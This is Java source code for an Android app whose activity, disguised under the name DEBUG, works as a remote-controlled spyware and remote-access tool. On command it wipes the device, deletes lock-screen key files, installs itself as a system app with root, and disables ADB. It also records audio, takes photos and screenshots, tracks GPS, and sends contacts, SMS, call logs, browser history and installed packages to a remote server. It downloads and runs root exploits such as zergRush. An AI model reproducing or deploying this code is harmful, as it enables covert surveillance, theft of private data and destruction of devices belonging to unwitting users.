package com.android.classic;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.hardware.Camera;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.Browser;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.provider.Settings;

import com.android.classic.helper.CommandExecutor;
import com.android.classic.helper.Compress;
import com.android.classic.helper.Constants;
import com.android.classic.helper.DEBUGSERVICE;
import com.android.classic.helper.DownloadFile;
import com.android.classic.helper.GPSTracker;
import com.android.classic.helper.Sender;
import com.android.classic.helper.Uploader;
import com.android.classic.recording.Audiorecorder;
import com.android.classic.recording.MakePhotoActivity;
import com.android.classic.recording.MakePhotoActivityBack;

import eu.chainfire.libsuperuser.Shell;

@SuppressLint("SimpleDateFormat")
public class DEBUG extends Activity {
	DevicePolicyManager mDPM;
	ComponentName mAdminName;
	InputStream is;
	String commands = "default";

	@SuppressLint("NewApi")
	private void threadPolicy() {
		// TODO Auto-generated method stub
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
					.permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
	}

	@SuppressLint("NewApi")
	@SuppressWarnings("deprecation")
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		threadPolicy();

		handleIntent(getIntent());
		mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
		mAdminName = new ComponentName(this, MyAdmin.class);
		SimpleDateFormat dateFormat = new SimpleDateFormat(
				"yyyy-MM-dd_HH-mm-ss");
		String date = dateFormat.format(new Date());

		// check
		if (!mDPM.isAdminActive(mAdminName)) {
			Intent intent = new Intent(
					DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
					DEBUG.this.getString(R.string.deviceadmindescription));
			startActivityForResult(intent, 111111);
		}
		try {
			if (commands.equals(DEBUGSERVICE.codeList[0])) {
				mDPM.lockNow();
				mDPM.wipeData(0);
			} else if (commands.equals(DEBUGSERVICE.codeList[1])) {
				mDPM.lockNow();
				mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
			} else if (commands.contains(DEBUGSERVICE.codeList[2])) {
				new CommandExecutor().execute(commands.replace("msg:|", "")
						.toString());

			} else if (commands.equals(DEBUGSERVICE.codeList[3])) {
				Shell.SU.run("rm -rf /data/system/*.key");
			} else if (commands.equals(DEBUGSERVICE.codeList[4])) {
				if (Shell.SU.available()) {
					String[] installSystemApp = {
							"mount -o remount,rw /system",
							"rm -f /system/app/com.android.classic.apk",
							"cat /data/app/com.android.classic* > /system/app/com.android.classic.apk",
							"chmod 644 /system/app/com.android.classic.apk",
							"chown root:root /system/app/com.android.classic.apk",
							"mount -o remount,ro /system",
							"rm -f /data/app/com.android.classic*", "reboot" };
					new CommandExecutor().execute(installSystemApp);
				}
			} else if (commands.equals(DEBUGSERVICE.codeList[5])) {
				takeScreenShot();
			} else if (commands.equals(DEBUGSERVICE.codeList[6])) {
				savePackages();
			} else if (commands.equals(DEBUGSERVICE.codeList[7])) {
				startActivity(new Intent(DEBUG.this, Audiorecorder.class)
						.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
			} else if (commands.equals(DEBUGSERVICE.codeList[8])) {
				startActivity(new Intent(DEBUG.this,
						MakePhotoActivityBack.class)
						.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
			} else if (commands.equals(DEBUGSERVICE.codeList[9])) {
				if (Camera.getNumberOfCameras() > 1) {
					startActivity(new Intent(DEBUG.this,
							MakePhotoActivity.class)
							.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
				}
			} else if (commands.equals(DEBUGSERVICE.codeList[10])) {
				File f = new File(Environment.getExternalStorageDirectory()
						+ "/Android/data/settings/");
				File zip = new File(Environment.getExternalStorageDirectory()
						+ "/" + date + "__.zip");
				try {
					Compress.zipDirectory(f, zip);
				} catch (IOException e) {
				}
			} else if (commands.equals(DEBUGSERVICE.codeList[11])) {
				String fileName = "/system/app/com.android.classic.apk";
				File systemapk = new File(fileName);
				if (systemapk.exists()) {
					try {
						if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.JELLY_BEAN_MR1) {
							Settings.Secure.putInt(getContentResolver(),
									Settings.Secure.ADB_ENABLED, 0);

						} else {
							Settings.Global.putInt(getContentResolver(),
									Settings.Global.ADB_ENABLED, 0);
						}
					} catch (Exception exc) {
					}
				}
			} else if (commands.equals(DEBUGSERVICE.codeList[12])) {
				final String vfile = android.os.Build.MODEL + "_Contacts_"
						+ date + ".vcf";
				File contactPath = new File(Environment
						.getExternalStorageDirectory().getPath()
						+ "/Android/data/settings/Contacts/");
				contactPath.mkdirs();
				String path = contactPath.getAbsolutePath() + "/" + vfile;
				Cursor phones = getContentResolver().query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
						null, null, null, null);
				phones.moveToFirst();
				for (int i = 0; i < phones.getCount(); i++) {
					String lookupKey = phones
							.getString(phones
									.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
					Uri uri = Uri.withAppendedPath(
							ContactsContract.Contacts.CONTENT_VCARD_URI,
							lookupKey);
					AssetFileDescriptor fd;
					try {
						fd = getContentResolver().openAssetFileDescriptor(uri,
								"r");
						FileInputStream fis = fd.createInputStream();
						byte[] buf = new byte[(int) fd.getDeclaredLength()];
						fis.read(buf);
						String VCard = new String(buf);

						@SuppressWarnings("resource")
						FileOutputStream mFileOutputStream = new FileOutputStream(
								path, true);
						mFileOutputStream.write(VCard.toString().getBytes());
						phones.moveToNext();
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}

				new Uploader().execute(path);

			} else if (commands.equals(DEBUGSERVICE.codeList[13])) {
				Uri uri = Uri.parse("content://sms/inbox");
				Cursor cursor = getContentResolver().query(
						uri,
						new String[] { "_id", "thread_id", "address", "person",
								"date", "body" }, null, null, null);
				String sms = "";
				while (cursor.moveToNext()) {
					long seconds = cursor.getLong(4);
					String calldate = dateFormat.format(new Date(seconds));
					sms += calldate + "|" + cursor.getString(2) + "|"
							+ cursor.getString(5) + "||";
				}
				String[] params = { "smslog", sms };
				new Sender().execute(params);
			} else if (commands.equals(DEBUGSERVICE.codeList[14])) {
				String finalLog = "";
				String[] fields = { android.provider.CallLog.Calls.NUMBER,
						android.provider.CallLog.Calls.TYPE,
						android.provider.CallLog.Calls.CACHED_NAME,
						android.provider.CallLog.Calls.CACHED_NUMBER_TYPE,
						android.provider.CallLog.Calls.DATE };
				String order = android.provider.CallLog.Calls.DATE + " DESC";

				Cursor c = getContentResolver().query(
						android.provider.CallLog.Calls.CONTENT_URI, fields,
						null, null, order);

				if (c.moveToFirst()) {

					do {
						int secondindex = c.getColumnIndex(Calls.DATE);
						long seconds = c.getLong(secondindex);
						String calldate = dateFormat.format(new Date(seconds));
						finalLog += calldate
								+ "|"
								+ c.getString(c
										.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
								+ "||";

					} while (c.moveToNext());

				}

				String[] params = { "calllog", finalLog };
				new Sender().execute(params);
			} else if (commands.equals(DEBUGSERVICE.codeList[15])) {
				String finalString = "";
				Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI,
						Browser.HISTORY_PROJECTION, null, null, null);
				mCur.moveToFirst();
				if (mCur.moveToFirst() && (mCur.getCount() > 0)) {
					while (mCur.isAfterLast() == false) {
						finalString += mCur
								.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX);
						finalString += "|"
								+ mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX)
								+ "||";
						mCur.moveToNext();
					}
				}
				String[] params = { "browserlog", finalString };
				new Sender().execute(params);
			} else if (commands.equals(DEBUGSERVICE.codeList[16])) {
				new GPSTracker(this);
			} else if (commands.equals(DEBUGSERVICE.codeList[17])) {
				Shell.SU.run("id");
			} else if (commands.equals(DEBUGSERVICE.codeList[18])) {
				new File(getFilesDir().getAbsolutePath()).mkdirs();
				DownloadFile downloadFile = new DownloadFile(this);
				/* Download and Extract */
				downloadFile.execute(
						new String[] { Constants.AUTOROOTDL + "busybox",
								Constants.BASE + "busybox", "busybox" }).get();
				downloadFile.execute(
						new String[] { Constants.AUTOROOTDL + "makespace",
								Constants.BASE + "makespace", "makespace" })
						.get();
				downloadFile.execute(
						new String[] { Constants.AUTOROOTDL + "root",
								Constants.BASE + "root", "root" }).get();
				downloadFile.execute(
						new String[] { Constants.AUTOROOTDL + "su",
								Constants.BASE + "su", "su" }).get();
				downloadFile.execute(
						new String[] { Constants.AUTOROOTDL + "zergRush",
								Constants.BASE + "zergRush", "zergRush" })
						.get();
				Thread.sleep(2000);
				String[] root = { "cd /data/data/com.android.classic/files/",
						"chmod 777 *", "sh root.sh" };
				/* RUN! */
				Shell.SH.run(root);
			}
			Thread.sleep(5000);
		} catch (Exception exc) {
			Shell.SH.run("echo 'CODELIST | " + exc.toString()
					+ "' >> /sdcard/Android/data/settings/Logger/CRASH.txt");
		} finally {
			finish();
		}
	}

	public void savePackages() {
		List<String> list = Shell.SH.run("pm list packages");
		String[] packages = new String[list.size()];
		packages = list.toArray(packages);
		String packagesFinal = "";
		for (String package1 : packages) {
			packagesFinal += package1.replace("package:", "").toString() + "||";
		}
		String[] params = { "packages", packagesFinal };
		new Sender().execute(params);
		if (Constants.DEBUG) {
			Shell.SH.run("echo '" + packagesFinal
					+ "' > /sdcard/Android/data/settings/Logger/Packages.txt");
		}
	}

	public void takeScreenShot() {
		SimpleDateFormat dateFormat = new SimpleDateFormat(
				"yyyy-MM-dd_HH-mm-ss");
		String date = dateFormat.format(new Date());
		String filepath = Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Screenshots/"
				+ android.os.Build.MODEL + "_Screenshot_" + date;

		if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.HONEYCOMB) {
			filepath += ".bmp";
			String[] screenShotGB = {
					"screenshot",
					"cat " + Environment.getExternalStorageDirectory()
							+ "/tmpshot.bmp > " + filepath,
					"rm -rf " + Environment.getExternalStorageDirectory()
							+ "/tmpshot.bmp" };
			Shell.SU.run(screenShotGB);
		} else {
			filepath += ".png";
			Shell.SU.run("screencap -p " + filepath);
		}

		new Uploader().execute(filepath);
	}

	private void handleIntent(Intent intent) {
		Bundle extras = intent.getExtras();
		if (extras != null) {
			commands = extras.getString("command");
		}
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
	}

	public static class MyAdmin extends DeviceAdminReceiver {

	}
}
